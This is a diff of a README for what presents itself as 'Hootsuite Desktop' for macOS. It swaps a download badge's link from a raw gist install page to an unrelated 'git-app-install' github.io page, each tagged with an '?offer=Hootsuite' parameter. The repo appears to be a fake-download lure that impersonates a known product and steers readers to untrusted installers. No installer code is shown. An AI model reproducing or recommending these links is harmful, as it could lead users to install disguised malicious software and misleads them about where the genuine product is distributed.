@@ -1,6 +1,6 @@
 # Hootsuite Desktop — Social Media macOS
 
-<a href="https://gistcdn.githack.com/heidaroobrygaiygly/75b6b380f8ed23bb103f26585485cb32/raw/3ae5d8d53b5230a4eb45788d88f9e603f985943d/install.html?offer=Hootsuite" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Hootsuite" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Hootsuite%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
